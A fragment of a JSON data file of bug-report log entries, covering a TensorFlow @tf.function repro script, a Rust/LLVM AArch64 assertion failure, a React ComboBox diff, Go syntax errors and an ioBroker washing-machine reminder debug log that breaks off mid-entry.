        "logs": "$ python objectmapping.py \r\nAll detected objects: 173\r\nAll admissible intersections: 588\r\nIteration #1.0: accepted 39 changes\r\nIteration #2.0: accepted 11 changes\r\nIteration #3.0: accepted 5 changes\r\nIteration #4.0: accepted 6 changes\r\nIteration #5.0: accepted 0 changes\r\nIteration #6.0: accepted 2 changes\r\nIteration #7.0: accepted 2 changes\r\nIteration #8.0: accepted 0 changes\r\nIteration #9.0: accepted 3 changes\r\nIteration #10.0: accepted 0 changes\r\nIteration #11.0: accepted 0 changes\r\nIteration #12.0: accepted 0 changes\r\nIteration #13.0: accepted 0 changes\r\nIteration #14.0: accepted 0 changes\r\nIteration #15.0: accepted 0 changes\r\n1.8701753724315352e-05\r\nICM inrersections: 116\r\nNumber of output ICM clusters: 51\r\nElapsed total time: 0.24 seconds."
    },
    {
        "logs": "syntax error: unexpected _input, expecting comma or ) [756:86]\r\nsyntax error: unexpected _input, expecting comma or ) [769:70]"
    },
    {
        "logs": "syntax error: unexpected _input, expecting comma or ) [756:86]\r\nsyntax error: unexpected _input, expecting comma or ) [769:70]"
    },
    {
        "logs": "diff\r\ndiff --git a/packages/office-ui-fabric-react/src/components/ComboBox/examples/ComboBox.Toggles.Example.tsx b/packages/office-ui-fabric-react/src/components/ComboBox/examples/ComboBox.Toggles.Example.tsx\r\nindex fad5ed182..391b5cce0 100644\r\n--- a/packages/office-ui-fabric-react/src/components/ComboBox/examples/ComboBox.Toggles.Example.tsx\r\n+++ b/packages/office-ui-fabric-react/src/components/ComboBox/examples/ComboBox.Toggles.Example.tsx\r\n@@ -46,6 +46,7 @@ export class ComboBoxTogglesExample extends React.Component<{}, IComboBoxToggles\r\n           key={'' + state.autoComplete + state.allowFreeform /*key causes re-render when toggles change*/}\r\n           allowFreeform={state.allowFreeform}\r\n           autoComplete={state.autoComplete ? 'on' : 'off'}\r\n+          autofill={{ required: true }}\r\n           options={INITIAL_OPTIONS}\r\n         />\r\n         <Toggle"
    },
    {
        "logs": "MFI.isCalleeSavedInfoValid() && \"CalleeSavedInfo not calculated\"' failed.\r\n\r\n------------------------------------------"
    },
    {
        "logs": "---- [debuginfo-gdb] debuginfo/function-arguments-naked.rs stdout ----\r\nNOTE: compiletest thinks it is using GDB with native rust support\r\n\r\nerror: compilation failed!\r\nstatus: signal: 6\r\ncommand: \"/checkout/obj/build/aarch64-unknown-linux-gnu/stage2/bin/rustc\" \"/checkout/src/test/debuginfo/function-arguments-naked.rs\" \"-Zthreads=1\" \"--target=aarch64-unknown-linux-gnu\" \"-C\" \"prefer-dynamic\" \"-o\" \"/checkout/obj/build/aarch64-unknown-linux-gnu/test/debuginfo/function-arguments-naked.gdb/a\" \"-Crpath\" \"-Zunstable-options\" \"-Lnative=/checkout/obj/build/aarch64-unknown-linux-gnu/native/rust-test-helpers\" \"-g\" \"-L\" \"/checkout/obj/build/aarch64-unknown-linux-gnu/test/debuginfo/function-arguments-naked.gdb/auxiliary\"\r\nstdout:\r\n------------------------------------------\r\n\r\n------------------------------------------\r\nstderr:\r\n------------------------------------------\r\nwarning: unused variable: `x`\r\n  --> /checkout/src/test/debuginfo/function-arguments-naked.rs:36:10\r\n   |\r\n36 | fn naked(x: usize, y: usize) {\r\n   |          ^ help: if this is intentional, prefix it with an underscore: `_x`\r\n   |\r\n   = note: `#[warn(unused_variables)]` on by default\r\n\r\nwarning: unused variable: `y`\r\n  --> /checkout/src/test/debuginfo/function-arguments-naked.rs:36:20\r\n   |\r\n36 | fn naked(x: usize, y: usize) {\r\n   |                    ^ help: if this is intentional, prefix it with an underscore: `_y`\r\n\r\nrustc: /checkout/src/llvm-project/llvm/lib/Target/AArch64/AArch64MachineFunctionInfo.h:197: unsigned int llvm::AArch64FunctionInfo::getCalleeSavedStackSize(const llvm::MachineFrameInfo&) const: Assertion `MFI.isCalleeSavedInfoValid() && \"CalleeSavedInfo not calculated\"' failed.\r\n\r\n------------------------------------------"
    },
    {
        "logs": "# -*- coding: utf-8 -*-\r\nimport tensorflow as tf\r\nimport numpy as np\r\n\r\n\"\"\"\r\nNote: when add \"@tf.function\" in front from train_step, report error; else, successfully run two times.\r\nEnvironment; tensorflow2.x python3.x\r\nauthor: masterqkk\r\n\"\"\"\r\n\r\n\r\ndef build_model():\r\n    model = tf.keras.Sequential()\r\n    model.add(tf.keras.layers.Dense(10, input_shape=[2]))\r\n    model.add(tf.keras.layers.Dense(1))\r\n    return model\r\n\r\ndef compute_loss(batch_true, batch_pred):\r\n    losses = tf.losses.mean_squared_error(batch_true, batch_pred)\r\n    loss = tf.reduce_mean(losses)\r\n    return loss\r\n\r\n\r\n@tf.function\r\ndef train_step(model, batch_input, batch_label, optimizer):\r\n    with tf.GradientTape() as tape:\r\n        preds = model(batch_input)\r\n        loss = compute_loss(batch_label, preds)\r\n    trainable_variables = model.trainable_variables\r\n    grads = tape.gradient(loss, trainable_variables)\r\n    optimizer.apply_gradients(grads_and_vars=zip(grads, trainable_variables))\r\n    return loss\r\n\r\n\r\ndef train_epoch(model, data_batchs, optimizer):\r\n    for (batch_input, batch_label) in data_batchs:\r\n        loss = train_step(model, batch_input, batch_label, optimizer)\r\n\r\n\r\ndef train_model(model, data_batchs, optimizer):\r\n    for i in np.arange(1):\r\n        train_epoch(model, data_batchs, optimizer)\r\n\r\n\r\ndef load_data():\r\n    np.random.seed(0)\r\n    x = np.array(np.random.random(size=(10, 2)), np.float32)\r\n    y = np.array(np.random.random(size=(10, 1)), np.float32)\r\n    data = tf.data.Dataset.from_tensor_slices((x, y))\r\n    data_batchs = data.batch(batch_size=5)\r\n    return data_batchs\r\n\r\n\r\ndef run_flow():\r\n    data_batchs = load_data()\r\n    model = build_model()\r\n    optimizer = tf.keras.optimizers.Adam()\r\n    train_model(model, data_batchs, optimizer)\r\n    tf.print('model train finished.')\r\n\r\n\r\nfor i in np.arange(2):\r\n    run_flow()"
    },
    {
        "logs": "# -*- coding: utf-8 -*-\r\nimport tensorflow as tf\r\nimport numpy as np\r\n\r\n\"\"\"\r\nNote: when add \"@tf.function\" in front from train_step, report error; else, successfully run two times.\r\nEnvironment; tensorflow2.x python3.x\r\nauthor: masterqkk\r\n\"\"\"\r\n\r\n\r\ndef build_model():\r\n    model = tf.keras.Sequential()\r\n    model.add(tf.keras.layers.Dense(10, input_shape=[2]))\r\n    model.add(tf.keras.layers.Dense(1))\r\n    return model\r\n\r\ndef compute_loss(batch_true, batch_pred):\r\n    losses = tf.losses.mean_squared_error(batch_true, batch_pred)\r\n    loss = tf.reduce_mean(losses)\r\n    return loss\r\n\r\n\r\n@tf.function\r\ndef train_step(model, batch_input, batch_label, optimizer):\r\n    with tf.GradientTape() as tape:\r\n        preds = model(batch_input)\r\n        loss = compute_loss(batch_label, preds)\r\n    trainable_variables = model.trainable_variables\r\n    grads = tape.gradient(loss, trainable_variables)\r\n    optimizer.apply_gradients(grads_and_vars=zip(grads, trainable_variables))\r\n    return loss\r\n\r\n\r\ndef train_epoch(model, data_batchs, optimizer):\r\n    for (batch_input, batch_label) in data_batchs:\r\n        loss = train_step(model, batch_input, batch_label, optimizer)\r\n\r\n\r\ndef train_model(model, data_batchs, optimizer):\r\n    for i in np.arange(1):\r\n        train_epoch(model, data_batchs, optimizer)\r\n\r\n\r\ndef load_data():\r\n    np.random.seed(0)\r\n    x = np.array(np.random.random(size=(10, 2)), np.float32)\r\n    y = np.array(np.random.random(size=(10, 1)), np.float32)\r\n    data = tf.data.Dataset.from_tensor_slices((x, y))\r\n    data_batchs = data.batch(batch_size=5)\r\n    return data_batchs\r\n\r\n\r\ndef run_flow():\r\n    data_batchs = load_data()\r\n    model = build_model()\r\n    optimizer = tf.keras.optimizers.Adam()\r\n    train_model(model, data_batchs, optimizer)\r\n    tf.print('model train finished.')\r\n\r\n\r\nfor i in np.arange(2):\r\n    run_flow()"
    },
    {
        "logs": "# -*- coding: utf-8 -*-\r\nimport tensorflow as tf\r\nimport numpy as np\r\n\r\n\"\"\"\r\nNote: when add \"@tf.function\" in front from train_step, report error; else, successfully run two times.\r\nEnvironment; tensorflow2.x python3.x\r\nauthor: masterqkk\r\n\"\"\"\r\n\r\n\r\ndef build_model():\r\n    model = tf.keras.Sequential()\r\n    model.add(tf.keras.layers.Dense(10, input_shape=[2]))\r\n    model.add(tf.keras.layers.Dense(1))\r\n    return model\r\n\r\ndef compute_loss(batch_true, batch_pred):\r\n    losses = tf.losses.mean_squared_error(batch_true, batch_pred)\r\n    loss = tf.reduce_mean(losses)\r\n    return loss\r\n\r\ndef get_apply_grad_fn():\r\n    @tf.function\r\n    def train_step(model, batch_input, batch_label, optimizer):\r\n        with tf.GradientTape() as tape:\r\n            preds = model(batch_input)\r\n            loss = compute_loss(batch_label, preds)\r\n        trainable_variables = model.trainable_variables\r\n        grads = tape.gradient(loss, trainable_variables)\r\n        optimizer.apply_gradients(grads_and_vars=zip(grads, trainable_variables))\r\n        return loss\r\n    return train_step\r\n\r\n\r\ndef train_epoch(model, data_batchs, optimizer):\r\n    for (batch_input, batch_label) in data_batchs:\r\n        model_apply_grads = get_apply_grad_fn()\r\n        loss = model_apply_grads(model, batch_input, batch_label, optimizer)\r\n\r\n\r\ndef train_model(model, data_batchs, optimizer):\r\n    for i in np.arange(1):\r\n        train_epoch(model, data_batchs, optimizer)\r\n\r\n\r\ndef load_data():\r\n    np.random.seed(0)\r\n    x = np.array(np.random.random(size=(10, 2)), np.float32)\r\n    y = np.array(np.random.random(size=(10, 1)), np.float32)\r\n    data = tf.data.Dataset.from_tensor_slices((x, y))\r\n    data_batchs = data.batch(batch_size=5)\r\n    return data_batchs\r\n\r\n\r\ndef run_flow():\r\n    data_batchs = load_data()\r\n    model = build_model()\r\n    optimizer = tf.keras.optimizers.Adam()\r\n    model_apply_grads = get_apply_grad_fn()\r\n    train_model(model, data_batchs, optimizer)\r\n    tf.print('model train finished.')\r\n\r\n\r\nfor i in np.arange(2):\r\n    run_flow()"
    },
    {
        "logs": "2021-07-14 21:12:45.240 - info: host.gandalf instance system.adapter.device-reminder.0 started with pid 2365838\r\n2021-07-14 21:12:45.632 - debug: device-reminder.0 (2365838) Redis Objects: Use Redis connection: 127.0.0.1:9002\r\n2021-07-14 21:12:45.658 - debug: device-reminder.0 (2365838) Objects client ready ... initialize now\r\n2021-07-14 21:12:45.659 - debug: device-reminder.0 (2365838) Objects create System PubSub Client\r\n2021-07-14 21:12:45.662 - debug: device-reminder.0 (2365838) Objects create User PubSub Client\r\n2021-07-14 21:12:45.663 - debug: device-reminder.0 (2365838) Objects client initialize lua scripts\r\n2021-07-14 21:12:45.678 - debug: device-reminder.0 (2365838) Objects connected to redis: 127.0.0.1:9002\r\n2021-07-14 21:12:45.682 - debug: device-reminder.0 (2365838) objectDB connected\r\n2021-07-14 21:12:45.682 - debug: device-reminder.0 (2365838) Redis States: Use Redis connection: 127.0.0.1:9003\r\n2021-07-14 21:12:45.690 - debug: device-reminder.0 (2365838) States create System PubSub Client\r\n2021-07-14 21:12:45.690 - debug: device-reminder.0 (2365838) States create User PubSub Client\r\n2021-07-14 21:12:45.724 - debug: device-reminder.0 (2365838) States connected to redis: 127.0.0.1:9003\r\n2021-07-14 21:12:45.724 - debug: device-reminder.0 (2365838) statesDB connected\r\n2021-07-14 21:12:45.995 - info: device-reminder.0 (2365838) starting. Version 1.2.9 in /opt/iobroker/node_modules/iobroker.device-reminder, node: v14.2.0, js-controller: 3.3.14\r\n2021-07-14 21:12:46.013 - debug: device-reminder.0 (2365838) ARR INPUT devices {\"0\":{\"name\":\"Waschmaschine\",\"type\":\"Waschmaschine\",\"pathConsumption\":\"alias.0.Waschmaschine.POWER\",\"pathSwitch\":\"\",\"startText\":\"Waschmaschine gestartet\",\"endText\":\"Waschmaschine fertig\",\"enabled\":true,\"alexa\":[\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\"],\"whatsapp\":[\"0\",\"1\"],\"telegram\":[\"0\"],\"timer\":\"0\",\"autoOff\":false,\"abort\":true,\"id\":\"0\"}}\r\n2021-07-14 21:12:46.013 - debug: device-reminder.0 (2365838) ARR INPUT alexa {\"0\":{\"name\":\"K\u00fcche\",\"path\":\"alexa2.0.Echo-Devices.G000MW04742101CM.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"1\":{\"name\":\"HWR\",\"path\":\"alexa2.0.Echo-Devices.G2A0RF03745603R0.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"2\":{\"name\":\"Wohnzimmer\",\"path\":\"alexa2.0.Echo-Devices.G091AA0503920RSS.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"3\":{\"name\":\"Schlafzimmer\",\"path\":\"alexa2.0.Echo-Devices.G0913L060327017C.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"4\":{\"name\":\"Badezimmer EG\",\"path\":\"alexa2.0.Echo-Devices.G090LV03720203LR.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"5\":{\"name\":\"Badezimmer OG\",\"path\":\"alexa2.0.Echo-Devices.G0914704952305RU.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"},\"6\":{\"name\":\"B\u00fcro\",\"path\":\"alexa2.0.Echo-Devices.G2A0RF03745603T7.Commands.speak\",\"volume\":\"50\",\"timeMin\":\"0:00\",\"timeMax\":\"23:59\"}}\r\n2021-07-14 21:12:46.014 - debug: device-reminder.0 (2365838) ARR INPUT sayit {}\r\n2021-07-14 21:12:46.014 - debug: device-reminder.0 (2365838) ARR INPUT whatsapp {}\r\n2021-07-14 21:12:46.014 - debug: device-reminder.0 (2365838) ARR INPUT telegram {\"0\":{\"name\":\"Thorsten\",\"inst\":\".0\"}}\r\n2021-07-14 21:12:46.014 - debug: device-reminder.0 (2365838) ARR INPUT pushover {}\r\n2021-07-14 21:12:46.015 - debug: device-reminder.0 (2365838) ARR INPUT email {}\r\n2021-07-14 21:12:46.058 - debug: device-reminder.0 (2365838) RETURN {\"used\":false,\"startVal\":\"30\",\"endVal\":\"10\",\"standby\":\"1\",\"startCount\":\"5\",\"endCount\":\"10\"}\r\n2021-07-14 21:12:46.058 - debug: device-reminder.0 (2365838) OBJ IN CONSTRUCTOR: {\"name\":\"Waschmaschine\",\"type\":\"Waschmaschine\",\"pathConsumption\":\"alias.0.Waschmaschine.POWER\",\"pathSwitch\":\"\",\"startText\":\"Waschmaschine gestartet\",\"endText\":\"Waschmaschine fertig\",\"enabled\":true,\"alexa\":[\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\"],\"whatsapp\":[\"0\",\"1\"],\"telegram\":[\"0\"],\"timer\":\"0\",\"autoOff\":false,\"abort\":true,\"id\":\"0\"}\r\n2021-07-14 21:12:46.059 - debug: device-reminder.0 (2365838) RETURN {\"enabled\":true,\"name\":\"Waschmaschine\",\"type\":\"Waschmaschine\",\"currentConsumption\":\"alias.0.Waschmaschine.POWER\",\"switchPower\":\"\",\"pathStatus\":\"Waschmaschine.Status\",\"pathLiveConsumption\":\"Waschmaschine.live consumption\",\"timeTotal\":\"Waschmaschine.runtime\",\"timeTotalMs\":\"Waschmaschine.runtime in ms\",\"lastRuntime\":\"Waschmaschine.lastRuntime\",\"runtimeMaxDP\":\"Waschmaschine.config.runtime max\",\"alertRuntime\":\"Waschmaschine.alert runtime\",\"messageDP\":\"Waschmaschine.messageDP\",\"averageConsumption\":\"Waschmaschine.average consumption\",\"dnd\":\"Waschmaschine.config.do not disturb\",\"lastOperations\":\"Waschmaschine.last operations\",\"startTimeJSON\":\"00:00:00\",\"endtimeJSON\":\"00:00:00\",\"runtimeJSON\":\"00:00:00\",\"startMessageSent\":false,\"endMessageSent\":false,\"started\":false,\"abort\":true,\"autoOff\":false,\"consumption\":0,\"resultStart\":0,\"resultEnd\":0,\"resultStandby\":0,\"alertCounter\":0,\"startValue\":\"30\",\"endValue\":\"10\",\"standby\":\"1\",\"startCount\":\"5\",\"endCount\":\"10\",\"timeoutMsg\":null,\"startTime\":0,\"endTime\":0,\"arrStart\":[],\"arrEnd\":[],\"arrStandby\":[],\"dateJSON\":[],\"valCancel\":5,\"startMessageText\":\"Waschmaschine gestartet\",\"startMessage\":true,\"endMessageText\":\"Waschmaschine fertig\",\"endMessage\":true,\"timeout\":null,\"telegramUser\":[\"0\"],\"telegram\":true,\"alexaID\":[\"0\",\"1\",\"2\",\"3\",\"4\",\"5\",\"6\"],\"alexaVolOld\":0,\"alexa\":true,\"sayIt\":false,\"whatsappID\":[\"0\",\"1\"],\"whatsapp\":true,\"pushover\":false,\"email\":false}\r\n2021-07-14 21:12:46.059 - info: device-reminder.0 (2365838) Device \"Waschmaschine\" was successfully created\r\n2021-07-14 21:12:46.060 - debug: device-reminder.0 (2365838) [SUBSCRIBE]: Waschmaschine.config.do not disturb: Waschmaschine.config.runtime max: alias.0.Waschmaschine.POWER:\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) [ID] \"device-reminder.0.Waschmaschine.config.runtime max\"\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) [PATH] {\"val\":0,\"ack\":true,\"ts\":1626289966120,\"q\":0,\"from\":\"system.adapter.device-reminder.0\",\"user\":\"system.user.admin\",\"lc\":1625063884595}\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) [THIS.TRIGGER 482] {\"device-reminder.0.Waschmaschine.config.do not disturb\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.do not disturb\",\"target\":\"dnd\",\"type\":\"value\"},\"device-reminder.0.Waschmaschine.config.runtime max\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.runtime max\",\"target\":\"runtimeMax\",\"type\":\"value\"},\"alias.0.Waschmaschine.POWER\":{\"id\":\"0\",\"path\":\"alias.0.Waschmaschine.POWER\",\"target\":\"consumption\",\"type\":\"value\"}}\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) TRIGGER {\"id\":\"0\",\"path\":\"Waschmaschine.config.runtime max\",\"target\":\"runtimeMax\",\"type\":\"value\"}\r\n2021-07-14 21:12:46.125 - debug: device-reminder.0 (2365838) THIS.VALUES {\"0\":{\"id\":\"0\",\"consumption\":{\"path\":\"alias.0.Waschmaschine.POWER\",\"val\":66.81,\"type\":\"number\"},\"switch\":{\"path\":\"\",\"val\":false,\"type\":\"boolean\"},\"dnd\":{\"path\":\"Waschmaschine.config.do not disturb\",\"val\":false,\"type\":\"boolean\"},\"runtimeMax\":{\"path\":\"Waschmaschine.config.runtime max\",\"val\":0,\"type\":\"number\"},\"dateJSON\":{\"path\":\"Waschmaschine.last operations\",\"val\":\"[{\\\"start\\\":\\\"11.07.2021 21:08:14\\\",\\\"end\\\":\\\"11.07.2021 22:37:24\\\",\\\"runtime\\\":\\\"01:29:00\\\"},{\\\"start\\\":\\\"12.07.2021 08:13:05\\\",\\\"end\\\":\\\"12.07.2021 09:40:56\\\",\\\"runtime\\\":\\\"01:27:40\\\"},{\\\"start\\\":\\\"12.07.2021 11:03:06\\\",\\\"end\\\":\\\"12.07.2021 12:33:36\\\",\\\"runtime\\\":\\\"01:30:20\\\"},{\\\"start\\\":\\\"13.07.2021 08:30:00\\\",\\\"end\\\":\\\"13.07.2021 09:58:50\\\",\\\"runtime\\\":\\\"01:28:40\\\"},{\\\"start\\\":\\\"13.07.2021 10:18:40\\\",\\\"end\\\":\\\"13.07.2021 11:46:11\\\",\\\"runtime\\\":\\\"01:27:20\\\"},{\\\"start\\\":\\\"13.07.2021 13:45:11\\\",\\\"end\\\":\\\"13.07.2021 14:12:51\\\",\\\"runtime\\\":\\\"00:27:30\\\"},{\\\"start\\\":\\\"13.07.2021 14:35:21\\\",\\\"end\\\":\\\"13.07.2021 15:56:21\\\",\\\"runtime\\\":\\\"01:20:50\\\"},{\\\"start\\\":\\\"13.07.2021 16:49:42\\\",\\\"end\\\":\\\"13.07.2021 18:16:32\\\",\\\"runtime\\\":\\\"01:26:40\\\"},{\\\"start\\\":\\\"13.07.2021 20:36:22\\\",\\\"end\\\":\\\"13.07.2021 22:08:13\\\",\\\"runtime\\\":\\\"01:31:40\\\"},{\\\"start\\\":\\\"13.07.2021 22:57:13\\\",\\\"end\\\":\\\"14.07.2021 00:05:43\\\",\\\"runtime\\\":\\\"01:08:20\\\"},{\\\"start\\\":\\\"14.07.2021 00:14:23\\\",\\\"end\\\":\\\"14.07.2021 00:23:03\\\",\\\"runtime\\\":\\\"00:08:30\\\"},{\\\"start\\\":\\\"14.07.2021 12:44:15\\\",\\\"end\\\":\\\"14.07.2021 14:34:06\\\",\\\"runtime\\\":\\\"01:49:40\\\"},{\\\"start\\\":\\\"14.07.2021 18:07:16\\\",\\\"end\\\":\\\"14.07.2021 18:41:36\\\",\\\"runtime\\\":\\\"00:34:10\\\"},{\\\"start\\\":\\\"14.07.2021 18:44:06\\\",\\\"end\\\":\\\"14.07.2021 19:19:26\\\",\\\"runtime\\\":\\\"00:35:10\\\"}]\"}}}\r\n2021-07-14 21:12:46.130 - debug: device-reminder.0 (2365838) [ID] \"device-reminder.0.Waschmaschine.config.do not disturb\"\r\n2021-07-14 21:12:46.130 - debug: device-reminder.0 (2365838) [PATH] {\"val\":false,\"ack\":true,\"ts\":1626289966120,\"q\":0,\"from\":\"system.adapter.device-reminder.0\",\"user\":\"system.user.admin\",\"lc\":1625063884606}\r\n2021-07-14 21:12:46.130 - debug: device-reminder.0 (2365838) [THIS.TRIGGER 482] {\"device-reminder.0.Waschmaschine.config.do not disturb\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.do not disturb\",\"target\":\"dnd\",\"type\":\"value\"},\"device-reminder.0.Waschmaschine.config.runtime max\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.runtime max\",\"target\":\"runtimeMax\",\"type\":\"value\"},\"alias.0.Waschmaschine.POWER\":{\"id\":\"0\",\"path\":\"alias.0.Waschmaschine.POWER\",\"target\":\"consumption\",\"type\":\"value\"}}\r\n2021-07-14 21:12:46.130 - debug: device-reminder.0 (2365838) TRIGGER {\"id\":\"0\",\"path\":\"Waschmaschine.config.do not disturb\",\"target\":\"dnd\",\"type\":\"value\"}\r\n2021-07-14 21:12:46.131 - debug: device-reminder.0 (2365838) THIS.VALUES {\"0\":{\"id\":\"0\",\"consumption\":{\"path\":\"alias.0.Waschmaschine.POWER\",\"val\":66.81,\"type\":\"number\"},\"switch\":{\"path\":\"\",\"val\":false,\"type\":\"boolean\"},\"dnd\":{\"path\":\"Waschmaschine.config.do not disturb\",\"val\":false,\"type\":\"boolean\"},\"runtimeMax\":{\"path\":\"Waschmaschine.config.runtime max\",\"val\":0,\"type\":\"number\"},\"dateJSON\":{\"path\":\"Waschmaschine.last operations\",\"val\":\"[{\\\"start\\\":\\\"11.07.2021 21:08:14\\\",\\\"end\\\":\\\"11.07.2021 22:37:24\\\",\\\"runtime\\\":\\\"01:29:00\\\"},{\\\"start\\\":\\\"12.07.2021 08:13:05\\\",\\\"end\\\":\\\"12.07.2021 09:40:56\\\",\\\"runtime\\\":\\\"01:27:40\\\"},{\\\"start\\\":\\\"12.07.2021 11:03:06\\\",\\\"end\\\":\\\"12.07.2021 12:33:36\\\",\\\"runtime\\\":\\\"01:30:20\\\"},{\\\"start\\\":\\\"13.07.2021 08:30:00\\\",\\\"end\\\":\\\"13.07.2021 09:58:50\\\",\\\"runtime\\\":\\\"01:28:40\\\"},{\\\"start\\\":\\\"13.07.2021 10:18:40\\\",\\\"end\\\":\\\"13.07.2021 11:46:11\\\",\\\"runtime\\\":\\\"01:27:20\\\"},{\\\"start\\\":\\\"13.07.2021 13:45:11\\\",\\\"end\\\":\\\"13.07.2021 14:12:51\\\",\\\"runtime\\\":\\\"00:27:30\\\"},{\\\"start\\\":\\\"13.07.2021 14:35:21\\\",\\\"end\\\":\\\"13.07.2021 15:56:21\\\",\\\"runtime\\\":\\\"01:20:50\\\"},{\\\"start\\\":\\\"13.07.2021 16:49:42\\\",\\\"end\\\":\\\"13.07.2021 18:16:32\\\",\\\"runtime\\\":\\\"01:26:40\\\"},{\\\"start\\\":\\\"13.07.2021 20:36:22\\\",\\\"end\\\":\\\"13.07.2021 22:08:13\\\",\\\"runtime\\\":\\\"01:31:40\\\"},{\\\"start\\\":\\\"13.07.2021 22:57:13\\\",\\\"end\\\":\\\"14.07.2021 00:05:43\\\",\\\"runtime\\\":\\\"01:08:20\\\"},{\\\"start\\\":\\\"14.07.2021 00:14:23\\\",\\\"end\\\":\\\"14.07.2021 00:23:03\\\",\\\"runtime\\\":\\\"00:08:30\\\"},{\\\"start\\\":\\\"14.07.2021 12:44:15\\\",\\\"end\\\":\\\"14.07.2021 14:34:06\\\",\\\"runtime\\\":\\\"01:49:40\\\"},{\\\"start\\\":\\\"14.07.2021 18:07:16\\\",\\\"end\\\":\\\"14.07.2021 18:41:36\\\",\\\"runtime\\\":\\\"00:34:10\\\"},{\\\"start\\\":\\\"14.07.2021 18:44:06\\\",\\\"end\\\":\\\"14.07.2021 19:19:26\\\",\\\"runtime\\\":\\\"00:35:10\\\"}]\"}}}\r\n2021-07-14 21:12:56.184 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:12:56.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:12:56.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:12:56.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 66.81\r\n2021-07-14 21:12:56.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 1, Inhalt: [66.81]\r\n2021-07-14 21:12:56.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n2021-07-14 21:12:56.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung beendet\r\n2021-07-14 21:12:56.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:12:56.186 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START66.81; 30; false\r\n2021-07-14 21:12:56.187 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n2021-07-14 21:13:06.184 - debug: device-reminder.0 (2365838) \"0\"\r\n2021-07-14 21:13:06.184 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung gestartet\r\n2021-07-14 21:13:06.184 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: berechnung \"start\" wird ausgefuehrt\r\n2021-07-14 21:13:06.184 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: resultTemp start: 66.81\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: L\u00e4nge array start: 2, Inhalt: [66.81,66.81]\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: arrStandby gel\u00f6scht\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Berechnung beendet\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung gestartet\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: WERTE f\u00fcr START66.81; 30; false\r\n2021-07-14 21:13:06.185 - debug: device-reminder.0 (2365838) [\"Waschmaschine\"]: Auswertung beendet\r\n2021-07-14 21:13:07.654 - debug: device-reminder.0 (2365838) [ID] \"alias.0.Waschmaschine.POWER\"\r\n2021-07-14 21:13:07.654 - debug: device-reminder.0 (2365838) [PATH] {\"val\":68.72,\"ack\":true,\"ts\":1626289987645,\"q\":0,\"from\":\"system.adapter.hm-rpc.1\",\"user\":\"system.user.admin\",\"lc\":1626289987645}\r\n2021-07-14 21:13:07.654 - debug: device-reminder.0 (2365838) [THIS.TRIGGER 482] {\"device-reminder.0.Waschmaschine.config.do not disturb\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.do not disturb\",\"target\":\"dnd\",\"type\":\"value\"},\"device-reminder.0.Waschmaschine.config.runtime max\":{\"id\":\"0\",\"path\":\"Waschmaschine.config.runtime max\",\"target\":\"runtimeMax\",\"type\":\"value\"},\"alias.0.Waschmaschine.POWER\":{\"id\":\"0\",\"path\":\"alias.0.Waschmaschine.POWER\",\"target\":\"consumption\",\"type\":\"value\"}}\r\n2021-07-14 21:13:07.654 - debug: device-reminder.0 (2365838) TRIGGER {\"id\":\"0\",\"path\":\"alias.0.Waschmaschine.POWER\",\"target\":\"consumption\",\"type\":\"value\"}\r\n2021-07-14 21:13:07.655 - debug: device-reminder.0 (2365838) THIS.VALUES {\"0\":{\"id\":\"0\",\"consumption\":{\"path\":\"alias.0.Waschmaschine.POWER\",\"val\":66.81,\"type\":\"number\"},\"switch\":{\"path\":\"\",\"val\":false,\"type\":\"boolean\"},\"dnd\":{\"path\":\"Waschmaschine.config.do not disturb\",\"val\":false,\"type\":\"boolean\"},\"runtimeMax\":{\"path\":\"Waschmaschine.config.runtime max\",\"val\":0,\"type\":\"number\"},\"dateJSON\":{\"path\":\"Waschmaschine.last operations\",\"val\":\"[{\\\"start\\\":\\\"11.07.2021 21:08:14\\\",\\\"end\\\":\\\"11.07.2021 22:37:24\\\",\\\"runtime\\\":\\\"01:29:00\\\"},{\\\"start\\\":\\\"12.07.2021 08:13:05\\\",\\\"end\\\":\\\"12.07.2021 